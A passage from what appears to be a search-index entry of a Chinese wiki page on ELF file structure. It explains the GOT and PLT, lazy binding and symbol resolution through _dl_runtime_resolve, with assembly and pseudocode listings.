\u901a\u5e38\u6765\u8bf4\uff0c\u5730\u5740\u72ec\u7acb\u4ee3\u7801\u4e0d\u80fd\u5305\u542b\u7edd\u5bf9\u865a\u62df\u5730\u5740\u3002GOT\u8868\u4e2d\u5305\u542b\u4e86\u9690\u85cf\u7684\u7edd\u5bf9\u5730\u5740\uff0c\u8fd9\u4f7f\u5f97\u5728\u4e0d\u8fdd\u80cc\u4f4d\u7f6e\u65e0\u5173\u6027\u4ee5\u53ca\u7a0b\u5e8f\u4ee3\u7801\u6bb5\u517c\u5bb9\u7684\u60c5\u51b5\u4e0b\uff0c\u5f97\u5230\u76f8\u5173\u7b26\u53f7\u7684\u7edd\u5bf9\u5730\u5740\u3002\u4e00\u4e2a\u7a0b\u5e8f\u53ef\u4ee5\u4f7f\u7528\u4f4d\u7f6e\u72ec\u7acb\u4ee3\u7801\u6765\u5f15\u7528\u5b83\u7684GOT\u8868\uff0c\u7136\u540e\u63d0\u53d6\u51fa\u6765\u7edd\u5bf9\u7684\u6570\u503c\uff0c\u4ee5\u4fbf\u4e8e\u5c06\u4f4d\u7f6e\u72ec\u7acb\u7684\u5f15\u7528\u91cd\u5b9a\u5411\u5230\u7edd\u5bf9\u7684\u5730\u5740\u3002 \u8fd9\u4e2a\u8868\u5bf9\u4e8e System V \u73af\u5883\u4e2d\u7684\u52a8\u6001\u94fe\u63a5\u6765\u8bf4\u662f\u5fc5\u8981\u7684\uff0c\u4f46\u5176\u5177\u4f53\u7684\u5185\u5bb9\u4ee5\u53ca\u5f62\u5f0f\u4f9d\u8d56\u4e8e\u5904\u7406\u5668\u3002 \u521d\u59cb\u65f6\uff0cgot \u8868\u4e2d\u5305\u542b\u91cd\u5b9a\u5411\u5165\u53e3\u6240\u9700\u8981\u7684\u4fe1\u606f\u3002\u5f53\u4e00\u4e2a\u7cfb\u7edf\u4e3a\u53ef\u52a0\u8f7d\u7684\u76ee\u6807\u6587\u4ef6\u521b\u5efa\u5185\u5b58\u6bb5\u65f6\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u5904\u7406\u91cd\u5b9a\u4f4d\u9879\uff0c\u5176\u4e2d\u7684\u4e00\u4e9b\u9879\u7684\u7c7b\u578b\u53ef\u80fd\u662f R_386_GLOB_DAT\uff0c\u8fd9\u4f1a\u6307\u5411 got \u8868\u3002\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u51b3\u5b9a\u76f8\u5173\u7684\u7b26\u53f7\u7684\u503c\uff0c\u8ba1\u7b97\u5b83\u4eec\u7684\u7edd\u5bf9\u5730\u5740\uff0c\u7136\u540e\u5c06\u5408\u9002\u7684\u5185\u5b58\u8868\u9879\u8bbe\u7f6e\u4e3a\u76f8\u5e94\u7684\u503c\u3002\u5c3d\u7ba1\u5728\u94fe\u63a5\u5668\u5efa\u7acb\u76ee\u6807\u6587\u4ef6\u65f6\uff0c\u7edd\u5bf9\u5730\u5740\u8fd8\u5904\u4e8e\u672a\u77e5\u72b6\u6001\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u77e5\u9053\u6240\u6709\u5185\u5b58\u6bb5\u7684\u5730\u5740\uff0c\u56e0\u4e3a\u53ef\u4ee5\u8ba1\u7b97\u6240\u5305\u542b\u7684\u7b26\u53f7\u7684\u7edd\u5bf9\u5730\u5740\u3002 \u5982\u679c\u4e00\u4e2a\u7a0b\u5e8f\u9700\u8981\u76f4\u63a5\u8bbf\u95ee\u4e00\u4e2a\u7b26\u53f7\u7684\u7edd\u5bf9\u5730\u5740\uff0c\u90a3\u4e48\u8fd9\u4e2a\u7b26\u53f7\u5c06\u4f1a\u6709\u4e00\u4e2a got \u8868\u9879\u3002\u7531\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u90fd\u6709\u5355\u72ec\u7684\u8868\u9879\uff0c\u6240\u4ee5\u4e00\u4e2a\u7b26\u53f7\u7684\u5730\u5740\u53ef\u80fd\u4f1a\u51fa\u73b0\u5728\u591a\u4e2a\u8868\u4e2d\u3002\u52a8\u6001\u94fe\u63a5\u5668\u5728\u628a\u6743\u9650\u7ed9\u5230\u8fdb\u7a0b\u955c\u50cf\u4e2d\u7684\u4ee3\u7801\u6bb5\u524d\uff0c\u4f1a\u5904\u7406\u6240\u6709\u7684 got \u8868\u4e2d\u7684\u91cd\u5b9a\u4f4d\u9879\uff0c\u4ee5\u4fbf\u4e8e\u786e\u5b9a\u6240\u6709\u7684\u7edd\u5bf9\u5730\u5740\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u662f\u53ef\u4ee5\u8bbf\u95ee\u7684\u3002 GOT \u8868\u4e2d\u7684\u7b2c 0 \u9879\u5305\u542b\u52a8\u6001\u7ed3\u6784\u7684\u5730\u5740\uff0c\u7528\u7b26\u53f7 _DYNAMIC \u6765\u8fdb\u884c\u5f15\u7528\u3002\u8fd9\u4f7f\u5f97\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u4f8b\u5982\u52a8\u6001\u94fe\u63a5\u5668\uff0c\u5728\u6ca1\u6709\u6267\u884c\u5176\u91cd\u5b9a\u5411\u524d\u53ef\u4ee5\u627e\u5230\u5bf9\u5e94\u7684\u52a8\u6001\u7ed3\u6784\u3002\u8fd9\u5bf9\u4e8e\u52a8\u6001\u94fe\u63a5\u5668\u6765\u8bf4\u662f\u975e\u5e38\u91cd\u8981\u7684\uff0c\u56e0\u4e3a\u5b83\u5fc5\u987b\u5728\u4e0d\u4f9d\u8d56\u5176\u5b83\u7a0b\u5e8f\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u91cd\u5b9a\u4f4d\u81ea\u5df1\u7684\u5185\u5b58\u955c\u50cf\u3002 \u5728\u4e0d\u540c\u7684\u7a0b\u5e8f\u4e2d\uff0c\u7cfb\u7edf\u53ef\u80fd\u4f1a\u4e3a\u540c\u4e00\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u9009\u62e9\u4e0d\u540c\u7684\u5185\u5b58\u6bb5\u5730\u5740\uff1b\u751a\u81f3\u5bf9\u4e8e\u540c\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5728\u4e0d\u540c\u7684\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u4e5f\u4f1a\u6709\u4e0d\u540c\u7684\u5e93\u5730\u5740\u3002\u7136\u800c\uff0c\u4e00\u65e6\u8fdb\u7a0b\u955c\u50cf\u88ab\u5efa\u7acb\uff0c\u5185\u5b58\u6bb5\u7684\u5730\u5740\u5c31\u4e0d\u4f1a\u518d\u6539\u53d8\uff0c\u53ea\u8981\u4e00\u4e2a\u8fdb\u7a0b\u8fd8\u5b58\u5728\uff0c\u5b83\u7684\u5185\u5b58\u6bb5\u5730\u5740\u5c06\u5904\u4e8e\u56fa\u5b9a\u7684\u4f4d\u7f6e\u3002 GOT \u8868\u7684\u5f62\u5f0f\u4ee5\u53ca\u89e3\u91ca\u4f9d\u8d56\u4e8e\u5177\u4f53\u7684\u5904\u7406\u5668\uff0c\u5bf9\u4e8e Intel \u67b6\u6784\u6765\u8bf4\uff0c _GLOBAL_OFFSET_TABLE_ \u7b26\u53f7\u53ef\u80fd\u88ab\u7528\u6765\u8bbf\u95ee\u8fd9\u4e2a\u8868\u3002 extern Elf32_Addr _GLOBAL_OFFSET_TABLE[]; GLOBAL_OFFSET_TABLE \u53ef\u80fd\u4f1a\u5728 .got \u8282\u7684\u4e2d\u95f4\uff0c\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u4f7f\u7528\u6b63\u8d1f\u7d22\u5f15\u6765\u8bbf\u95ee\u8fd9\u4e2a\u8868\u3002 \u5728 Linux \u7684\u5b9e\u73b0\u4e2d\uff0c.got.plt \u7684\u524d\u4e09\u9879\u7684\u5177\u4f53\u7684\u542b\u4e49\u5982\u4e0b GOT[0]\uff0c.dynamic \u7684\u5730\u5740\u3002 GOT[1]\uff0c\u6307\u5411\u5185\u90e8\u7c7b\u578b\u4e3a link_map \u7684\u6307\u9488\uff0c\u53ea\u4f1a\u5728\u52a8\u6001\u88c5\u8f7d\u5668\u4e2d\u4f7f\u7528\uff0c\u5305\u542b\u4e86\u8fdb\u884c\u7b26\u53f7\u89e3\u6790\u9700\u8981\u7684\u5f53\u524d ELF\u5bf9\u8c61\u7684\u4fe1\u606f\u3002\u6bcf\u4e2a link_map \u90fd\u662f\u4e00\u6761\u53cc\u5411\u94fe\u8868\u7684\u4e00\u4e2a\u8282\u70b9\uff0c\u800c\u8fd9\u4e2a\u94fe\u8868\u4fdd\u5b58\u4e86\u6240\u6709\u52a0\u8f7d\u7684 ELF \u5bf9\u8c61\u7684\u4fe1\u606f\u3002 GOT[2]\uff0c\u6307\u5411\u52a8\u6001\u88c5\u8f7d\u5668\u4e2d _dl_runtime_resolve \u51fd\u6570\u7684\u6307\u9488\u3002 .got.plt \u540e\u9762\u7684\u9879\u5219\u662f\u7a0b\u5e8f\u4e2d\u4e0d\u540c .so \u4e2d\u51fd\u6570\u7684\u5f15\u7528\u5730\u5740\u3002\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u76f8\u5e94\u7684\u5173\u7cfb\u3002 Procedure Linkage Table \u00b6 GOT \u8868\u7528\u6765\u5c06\u4f4d\u7f6e\u72ec\u7acb\u7684\u5730\u5740\u91cd\u5b9a\u5411\u4e3a\u7edd\u5bf9\u5730\u5740\uff0c\u4e0e\u6b64\u7c7b\u4f3c\uff0cPLT\u8868\u5c06\u4f4d\u7f6e\u72ec\u7acb\u7684\u51fd\u6570\u91cd\u5b9a\u5411\u5230\u7edd\u5bf9\u5730\u5740\u3002\u4e3b\u8981\u5305\u62ec\u4e24\u90e8\u5206 .plt \uff0c\u4e0e\u5e38\u89c1\u5bfc\u5165\u7684\u51fd\u6570\u6709\u5173\uff0c\u5982 read \u7b49\u51fd\u6570\u3002 .plt.got \uff0c\u4e0e\u52a8\u6001\u94fe\u63a5\u6709\u5173\u7cfb\u3002 \u5728\u52a8\u6001\u94fe\u63a5\u4e0b\uff0c\u7a0b\u5e8f\u6a21\u5757\u4e4b\u95f4\u5305\u542b\u4e86\u5927\u91cf\u7684\u51fd\u6570\u5f15\u7528\uff0c\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u524d\uff0c\u52a8\u6001\u94fe\u63a5\u4f1a\u8017\u8d39\u4e0d\u5c11\u65f6\u95f4\u7528\u4e8e\u89e3\u51b3\u6a21\u5757\u4e4b\u95f4\u7684\u51fd\u6570\u5f15\u7528\u7684\u7b26\u53f7\u67e5\u627e\u4ee5\u53ca\u91cd\u5b9a\u4f4d\u3002\u4f46\u662f\uff0c\u5728\u4e00\u4e2a\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u80fd\u5f88\u591a\u51fd\u6570\u5728\u7a0b\u5e8f\u6267\u884c\u5b8c\u65f6\u90fd\u4e0d\u4f1a\u7528\u5230\uff0c\u56e0\u6b64\u4e00\u5f00\u59cb\u5c31\u628a\u6240\u6709\u51fd\u6570\u90fd\u94fe\u63a5\u597d\u662f\u4e00\u79cd\u6d6a\u8d39\uff0c\u6240\u4ee5 ELF \u91c7\u7528\u4e86\u4e00\u79cd\u5ef6\u8fdf\u7ed1\u5b9a\u7684\u505a\u6cd5\uff0c\u5176\u57fa\u672c\u601d\u60f3\u662f\u51fd\u6570\u7b2c\u4e00\u6b21\u88ab\u7528\u5230\u65f6\u624d\u8fdb\u884c\u7ed1\u5b9a\uff08\u7b26\u53f7\u67e5\u627e\uff0c\u91cd\u5b9a\u4f4d\u7b49\uff09\uff0c\u5982\u679c\u6ca1\u6709\u7528\u5219\u4e0d\u8fdb\u884c\u7ed1\u5b9a\u3002\u6240\u4ee5\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u524d\uff0c\u6a21\u5757\u95f4\u7684\u51fd\u6570\u8c03\u7528\u90fd\u6ca1\u6709\u8fdb\u884c\u7ed1\u5b9a\uff0c\u800c\u662f\u9700\u8981\u7528\u5230\u65f6\u624d\u7531\u52a8\u6001\u94fe\u63a5\u5668\u8d1f\u8d23\u7ed1\u5b9a\u3002 \u94fe\u63a5\u7f16\u8f91\u5668\u4e0d\u80fd\u591f\u89e3\u6790\u6267\u884c\u6d41\u8f6c\u6362\uff08\u6bd4\u5982\u7a0b\u5e8f\u8c03\u7528\uff09\uff0c\u5373\u4ece\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u5230\u53e6\u4e00\u4e2a\u6587\u4ef6\u3002\u94fe\u63a5\u5668\u5b89\u6392\u7a0b\u5e8f\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9\u8fc7\u7a0b\u94fe\u63a5\u8868\u4e2d\u7684\u8868\u9879\u3002\u5728 Intel \u67b6\u6784\u4e2d\uff0c\u8fc7\u7a0b\u94fe\u63a5\u8868\u5b58\u5728\u4e8e\u5171\u4eab\u4ee3\u7801\u6bb5\u4e2d\uff0c\u4f46\u662f\u4ed6\u4eec\u4f1a\u4f7f\u7528\u5728 GOT \u8868\u4e2d\u7684\u6570\u636e\u3002\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u51b3\u5b9a\u76ee\u6807\u7684\u7edd\u5bf9\u5730\u5740\uff0c\u5e76\u4e14\u4f1a\u4fee\u6539\u76f8\u5e94\u7684 GOT \u8868\u4e2d\u7684\u5185\u5b58\u955c\u50cf\u3002\u56e0\u6b64\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u53ef\u4ee5\u5728\u4e0d\u8fdd\u80cc\u4f4d\u7f6e\u72ec\u7acb\u4ee5\u53ca\u7a0b\u5e8f\u4ee3\u7801\u6bb5\u517c\u5bb9\u7684\u60c5\u51b5\u4e0b\uff0c\u91cd\u5b9a\u5411 PLT \u9879\u3002\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u90fd\u6709\u72ec\u7acb\u7684 PLT \u8868\u3002 \u7edd\u5bf9\u5730\u5740\u7684\u8fc7\u7a0b\u94fe\u63a5\u8868\u5982\u4e0b .PLT0:pushl got_plus_4 jmp *got_plus_8 nop; nop nop; nop .PLT1:jmp *name1_in_GOT pushl $offset@PC jmp .PLT0@PC .PLT2:jmp *name2_in_GOT push $offset jmp .PLT0@PC ... \u4f4d\u7f6e\u65e0\u5173\u7684\u8fc7\u7a0b\u94fe\u63a5\u8868\u7684\u5730\u5740\u5982\u4e0b .PLT0:pushl 4(%ebx) jmp *8(%ebx) nop; nop nop; nop .PLT1:jmp *name1_in_GOT(%ebx) pushl $offset jmp .PLT0@PC .PLT2:jmp *name2_in_GOT(%ebx) push $offset jmp .PLT0@PC ... \u53ef\u4ee5\u770b\u51fa\u8fc7\u7a0b\u94fe\u63a5\u8868\u9488\u5bf9\u4e8e\u7edd\u5bf9\u5730\u5740\u4ee5\u53ca\u4f4d\u7f6e\u72ec\u7acb\u7684\u4ee3\u7801\u7684\u5904\u7406\u4e0d\u540c\u3002\u4f46\u662f\u52a8\u6001\u94fe\u63a5\u5668\u5904\u7406\u5b83\u4eec\u65f6\uff0c\u6240\u4f7f\u7528\u7684\u63a5\u53e3\u662f\u4e00\u6837\u7684\u3002 \u52a8\u6001\u94fe\u63a5\u5668\u548c\u7a0b\u5e8f\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u89e3\u6790\u8fc7\u7a0b\u94fe\u63a5\u8868\u548c\u5168\u5c40\u504f\u79fb\u8868\u7684\u7b26\u53f7\u5f15\u7528\u3002 \u5f53\u7b2c\u4e00\u6b21\u5efa\u7acb\u7a0b\u5e8f\u7684\u5185\u5b58\u955c\u50cf\u65f6\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5c06\u5168\u5c40\u504f\u79fb\u8868\u7684\u7b2c\u4e8c\u4e2a\u548c\u7b2c\u4e09\u4e2a\u9879\u8bbe\u7f6e\u4e3a\u7279\u6b8a\u7684\u503c\uff0c\u4e0b\u9762\u7684\u6b65\u9aa4\u4f1a\u4ed4\u7ec6\u89e3\u91ca\u8fd9\u4e9b\u6570\u503c\u3002 \u5982\u679c\u8fc7\u7a0b\u94fe\u63a5\u8868\u662f\u4f4d\u7f6e\u72ec\u7acb\u7684\u8bdd\uff0c\u90a3\u4e48 GOT \u8868\u7684\u5730\u5740\u5fc5\u987b\u5728 ebx \u5bc4\u5b58\u5668\u4e2d\u3002\u6bcf\u4e00\u4e2a\u8fdb\u7a0b\u955c\u50cf\u4e2d\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u90fd\u6709\u72ec\u7acb\u7684 PLT \u8868\uff0c\u5e76\u4e14\u7a0b\u5e8f\u53ea\u5728\u540c\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u5c06\u63a7\u5236\u6d41\u4ea4\u7ed9 PLT \u8868\u9879\u3002\u56e0\u6b64\uff0c\u8c03\u7528\u51fd\u6570\u8d1f\u8d23\u5728\u8c03\u7528 PLT\u8868\u9879\u4e4b\u524d\uff0c\u5c06\u5168\u5c40\u504f\u79fb\u8868\u7684\u57fa\u5730\u5740\u8bbe\u7f6e\u4e3a\u5bc4\u5b58\u5668\u4e2d\u3002 \u8fd9\u91cc\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5047\u8bbe\u7a0b\u5e8f\u8c03\u7528\u4e86name1\uff0c\u5b83\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9\u4e86 lable .PLT1\u3002 \u90a3\u4e48\uff0c\u7b2c\u4e00\u6761\u6307\u4ee4\u5c06\u4f1a\u8df3\u8f6c\u5230\u5168\u5c40\u504f\u79fb\u8868\u4e2d name1\u7684\u5730\u5740\u3002\u521d\u59cb\u65f6\uff0c\u5168\u5c40\u504f\u79fb\u8868\u4e2d\u5305\u542b PLT \u4e2d\u4e0b\u4e00\u6761 pushl\u6307\u4ee4\u7684\u5730\u5740\uff0c\u5e76\u4e0d\u662f name1\u7684\u5b9e\u9645\u5730\u5740\u3002 \u56e0\u6b64\uff0c\u7a0b\u5e8f\u5c06\u4e00\u4e2a\u91cd\u5b9a\u5411\u504f\u79fb\uff08reloc_index\uff09\u538b\u5230\u6808\u4e0a\u3002\u91cd\u5b9a\u4f4d\u504f\u79fb\u662f 32 \u4f4d\u7684\uff0c\u5e76\u4e14\u662f\u975e\u8d1f\u7684\u6570\u503c\u3002\u6b64\u5916\uff0c\u91cd\u5b9a\u4f4d\u8868\u9879\u7684\u7c7b\u578b\u4e3a R_386_JMP_SLOT\uff0c\u5e76\u4e14\u5b83\u5c06\u4f1a\u8bf4\u660e\u5728\u4e4b\u524d jmp \u6307\u4ee4\u4e2d\u4f7f\u7528\u7684\u5168\u5c40\u504f\u79fb\u8868\u9879\u5728 GOT \u8868\u4e2d\u7684\u504f\u79fb\u3002\u91cd\u5b9a\u4f4d\u8868\u9879\u4e5f\u5305\u542b\u4e86\u4e00\u4e2a\u7b26\u53f7\u8868\u7d22\u5f15\uff0c\u56e0\u6b64\u544a\u8bc9\u52a8\u6001\u94fe\u63a5\u5668\u4ec0\u4e48\u7b26\u53f7\u76ee\u524d\u6b63\u5728\u88ab\u5f15\u7528\u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u5c31\u662f name1\u4e86\u3002 \u5728\u538b\u5165\u91cd\u5b9a\u4f4d\u504f\u79fb\u540e\uff0c\u7a0b\u5e8f\u4f1a\u8df3\u8f6c\u5230 .PLT0\uff0c\u8fd9\u662f\u8fc7\u7a0b\u94fe\u63a5\u8868\u7684\u7b2c\u4e00\u4e2a\u8868\u9879\u3002pushl \u6307\u4ee4\u5c06 GOT \u8868\u7684\u7b2c\u4e8c\u4e2a\u8868\u9879(got_plus_4 \u6216\u80054(%ebx)\uff0c \u5f53\u524dELF\u5bf9\u8c61\u7684\u4fe1\u606f )\u538b\u5230\u6808\u4e0a\uff0c\u7136\u540e\u7ed9\u52a8\u6001\u94fe\u63a5\u5668\u4e00\u4e2a\u8bc6\u522b\u4fe1\u606f\u3002\u6b64\u540e\uff0c\u7a0b\u5e8f\u4f1a\u8df3\u8f6c\u5230\u7b2c\u4e09\u4e2a\u5168\u5c40\u504f\u79fb\u8868\u9879(got_plus_8 \u6216\u80058(%ebx)\uff0c \u6307\u5411\u52a8\u6001\u88c5\u8f7d\u5668\u4e2d_dl_runtime_resolve\u51fd\u6570\u7684\u6307\u9488 ) \u5904\uff0c\u8fd9\u5c06\u4f1a\u5c06\u7a0b\u5e8f\u6d41\u4ea4\u7ed9\u52a8\u6001\u94fe\u63a5\u5668\u3002 \u5f53\u52a8\u6001\u94fe\u63a5\u5668\u63a5\u6536\u5230\u63a7\u5236\u6743\u540e\uff0c\u4ed6\u5c06\u4f1a\u8fdb\u884c\u51fa\u6808\u64cd\u4f5c\uff0c\u67e5\u770b\u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u627e\u5230\u5bf9\u5e94\u7684\u7b26\u53f7\u7684\u503c\uff0c\u5c06 name1 \u7684\u5730\u5740\u5b58\u50a8\u5728\u5168\u5c40\u504f\u79fb\u8868\u9879\u4e2d\uff0c\u7136\u540e\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9\u76ee\u7684\u5730\u5740\u3002 \u8fc7\u7a0b\u94fe\u63a5\u8868\u6267\u884c\u4e4b\u540e\uff0c\u7a0b\u5e8f\u7684\u63a7\u5236\u6743\u5c06\u4f1a\u76f4\u63a5\u4ea4\u7ed9 name1 \u51fd\u6570\uff0c\u800c\u4e14\u6b64\u540e\u518d\u4e5f\u4e0d\u4f1a\u8c03\u7528\u52a8\u6001\u94fe\u63a5\u5668\u6765\u89e3\u6790\u8fd9\u4e2a\u51fd\u6570\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728 .PLT1 \u5904\u7684 jmp \u6307\u4ee4\u5c06\u4f1a\u76f4\u63a5\u8df3\u8f6c\u5230 name1 \u5904\uff0c\u800c\u4e0d\u662f\u518d\u6b21\u6267\u884c pushl \u6307\u4ee4\u3002 \u603b\u4f53\u6d41\u7a0b\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u84dd\u7ebf\u8868\u793a\u9996\u6b21\u6267\u884c\u7684\u6d41\u7a0b\u56fe\uff0c\u7ea2\u7ebf\u8868\u793a\u7b2c\u4e8c\u6b21\u4ee5\u540e\u8c03\u7528\u7684\u6d41\u7a0b\u56fe\uff1a LD_BIND_NOW \u73af\u5883\u53d8\u91cf\u53ef\u4ee5\u6539\u53d8\u52a8\u6001\u94fe\u63a5\u5668\u7684\u884c\u4e3a\u3002\u5982\u679c\u5b83\u7684\u503c\u975e\u7a7a\u7684\u8bdd\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5728\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9\u7a0b\u5e8f\u4e4b\u524d\u4f1a\u6267\u884c PLT \u8868\u9879\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5728\u8fdb\u7a0b\u521d\u59cb\u5316\u8fc7\u7a0b\u4e2d\u6267\u884c\u7c7b\u578b\u4e3a R_3862_JMP_SLOT \u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u3002\u5426\u5219\u7684\u8bdd\uff0c\u52a8\u6001\u94fe\u63a5\u8868\u4f1a\u5bf9\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u8fdb\u884c\u5ef6\u8fdf\u7ed1\u5b9a\uff0c\u76f4\u5230\u7b2c\u4e00\u6b21\u6267\u884c\u5bf9\u5e94\u7684\u8868\u9879\u65f6\uff0c\u624d\u4f1a\u4eca\u6b21\u90a3\u4e2a\u7b26\u53f7\u89e3\u6790\u4ee5\u53ca\u91cd\u5b9a\u4f4d\u3002 \u6ce8\u610f \u60f0\u6027\u7ed1\u5b9a\u901a\u5e38\u6765\u8bf4\u4f1a\u63d0\u9ad8\u5e94\u7528\u7a0b\u5e8f\u7684\u6027\u80fd\uff0c\u56e0\u4e3a\u6ca1\u6709\u4f7f\u7528\u7684\u7b26\u53f7\u5e76\u4e0d\u4f1a\u589e\u52a0\u52a8\u6001\u94fe\u63a5\u7684\u8d1f\u8f7d\u3002\u7136\u800c\uff0c\u6709\u4ee5\u4e0b\u4e24\u79cd\u60c5\u51b5\u5c06\u4f1a\u4f7f\u5f97\u60f0\u6027\u7ed1\u5b9a\u51fa\u73b0\u672a\u9884\u671f\u7684\u60c5\u51b5\u3002\u9996\u5148\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u51fd\u6570\u7684\u521d\u59cb\u5f15\u7528\u4e00\u822c\u6765\u8bf4\u4f1a\u8d85\u8fc7\u540e\u7eed\u8c03\u7528\u7684\u65f6\u95f4\uff0c\u56e0\u4e3a\u52a8\u6001\u94fe\u63a5\u5668\u9700\u8981\u62e6\u622a\u8c03\u7528\u4ee5\u4fbf\u4e8e\u53bb\u89e3\u6790\u7b26\u53f7\u3002\u4e00\u4e9b\u5e94\u7528\u5e76\u4e0d\u80fd\u591f\u5fcd\u53d7\u8fd9\u79cd\u4e0d\u53ef\u9884\u6d4b\u6027\u3002\u5176\u6b21\uff0c\u5982\u679c\u53d1\u751f\u4e86\u9519\u8bef\uff0c\u5e76\u4e14\u52a8\u6001\u94fe\u63a5\u5668\u4e0d\u80fd\u591f\u89e3\u6790\u7b26\u53f7\u3002\u52a8\u6001\u94fe\u63a5\u5668\u5c06\u4f1a\u7ec8\u6b62\u7a0b\u5e8f\u3002\u5728\u60f0\u6027\u7ed1\u5b9a\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd9\u79cd\u60c5\u51b5\u53ef\u80fd\u968f\u65f6\u53d1\u751f\u3002\u5f53\u5173\u95ed\u4e86\u60f0\u6027\u7ed1\u5b9a\u7684\u8bdd\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5728\u8fdb\u7a0b\u521d\u59cb\u5316\u7684\u8fc7\u7a0b\u4e2d\u5c31\u4e0d\u4f1a\u51fa\u73b0\u76f8\u5e94\u7684\u9519\u8bef\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u90fd\u662f\u5728\u5e94\u7528\u83b7\u5f97\u63a7\u5236\u6743\u4e4b\u524d\u6267\u884c\u7684\u3002 \u5728 Linux \u7684\u8bbe\u8ba1\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u4e4b\u540e\u7684 PLT \u6761\u76ee\u8fdb\u884c\u4e86\u5982\u4e0b\u7684\u51fd\u6570\u8c03\u7528 _dl_runtime_resolve ( link_map_obj , reloc_index ) \u8fd9\u91cc\u4ee5 32 \u4f4d\u4e3a\u4f8b\uff0864\u4f4d\u7c7b\u4f3c\uff09\uff0c\u5177\u4f53\u7684\u8fc7\u7a0b\u5982\u4e0b \u6839\u636e reloc_index \u8ba1\u7b97\u76f8\u5e94\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\uff1a Elf32_Rel *reloc = JMPREL + index \u6839\u636e\u5f97\u5230\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u7684r_info\u5f97\u5230\u5bf9\u5e94\u7684\u7b26\u53f7\u5728\u7b26\u53f7\u8868\u4e2d\u7684\u7d22\u5f15\uff1a (reloc->r_info)>>8 \u7ee7\u800c\u5f97\u5230\u5bf9\u5e94\u7684\u7b26\u53f7\uff1a Elf32_Sym *sym = &SYMTAB[((reloc->r_info)>>8)] \u5224\u65ad\u7b26\u53f7\u7684\u7c7b\u578b\u662f\u5426\u4e3a R_386_JMP_SLOT\uff1a assert (((reloc->r_info)&0xff) == 0x7 ) if ((ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0) if (sym->st_other) & 3 == 0 ) \u5224\u65ad\u8be5\u7b26\u53f7\u662f\u5426\u5df2\u7ecf\u89e3\u6790\u8fc7\u4e86\uff0c\u5982\u679c\u89e3\u6790\u8fc7\uff0c\u5c31\u4e0d\u4f1a\u518d\u53bb\u6267\u884c lookup \u64cd\u4f5c\u3002 \u5f97\u5230\u7b26\u53f7\u7684\u7248\u672c\uff0c\u5982\u679c ndx \u4e3a 0 \u7684\u8bdd\uff0c\u4f1a\u76f4\u63a5\u4f7f\u7528 local symbol\u3002 uint16_t ndx = VERSYM[ (reloc->r_info) >> 8] r_found_version *version = &l->l_version[ndx] \u6839\u636e name \u6765\u5bfb\u627e\u76f8\u5e94\u51fd\u6570\u5728\u5e93\u4e2d\u7684\u5730\u5740\u3002 name = STRTAB + sym->st_name .eh_frame related \u00b6 .eh_frame_hdr .eh_frame \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2aelf\u6587\u4ef6\u6bd4\u8f83\u7ecf\u5178\u7684\u4f8b\u5b50\u3002 \u6709\u65f6\u95f4\u4f1a\u7ed3\u5408\u5177\u4f53\u7684\u7a0b\u5e8f\uff0c\u7ed9\u51fa\u4e00\u4e2a\u66f4\u597d\u7684\u4f8b\u5b50\u3002 \u53c2\u8003\u6587\u732e \u00b6 https://blogs.oracle.com/ali/gnu-hash-elf-sections https://bbs.pediy.com/thread-204642.htm","title":"ELF\u6587\u4ef6\u57fa\u672c\u7ed3\u6784"},{"location":"executable/elf/elf_structure/#elf","text":"\u672c\u90e8\u5206\u5185\u5bb9\u6765\u6e90\u4e8e ELF 1.2 \u6807\u51c6\uff0c\u5185\u5bb9\u7ecf\u8fc7\u4e00\u5b9a\u7684\u4fee\u6539\u4e0e\u6574\u7406\uff0c\u4e3b\u8981\u53c2\u8003\u6587\u732e\u5982\u4e0b ELF 